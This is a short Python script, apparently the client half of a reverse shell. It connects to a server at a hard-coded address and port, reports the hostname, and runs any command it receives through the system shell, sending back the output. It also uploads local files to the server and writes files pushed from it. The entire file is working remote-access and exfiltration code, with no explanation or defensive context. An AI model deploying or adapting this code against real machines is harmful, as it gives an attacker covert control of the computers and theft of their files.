import socket
import subprocess
import time 

ip_address = '127.0.0.1'
port_number = 5555
packet_size = 2048
hostname = socket.gethostname()


def send_file(socket, filename):
    with open(filename,'rb') as inp:
        while True:
            print("sending data")
            bytes_read = inp.read(packet_size)
            if not bytes_read:
                print("breaking")
                time.sleep(1)
                socket.send(b'Send was done')
                break
            socket.send(bytes_read)
    inp.close()

def recv_file(socket,filename):
    with open(filename,'wb') as out:
        while True:
            print("recieving data")
            bytes_read = socket.recv(packet_size)
            print(bytes_read)
            if bytes_read == b'Send was done':
                print("breaking")
                break
            out.write(bytes_read)
    out.close()
client_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

client_socket.connect((ip_address,port_number))
client_socket.send(hostname.encode())
cmd = client_socket.recv(packet_size).decode().split(" ")

while cmd!=['bye']:
    print(cmd)
    if(cmd[0] =='download'):
        file_name = cmd[-1]
        recv_file(client_socket,file_name)
        client_socket.send("Download file finished successfully")

    elif(cmd[0] =='upload'):
        send_file(client_socket,cmd[1])

    else:
        p =subprocess.Popen(cmd,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
        output,error = p.communicate()
        msg = str(output.decode())
        if not msg:
            msg =str(error.decode())
        client_socket.send(msg.encode())
        print(cmd)
        print('waiting for input from SRV')
    cmd = list(client_socket.recv(packet_size).decode().split(" "))

client_socket.close()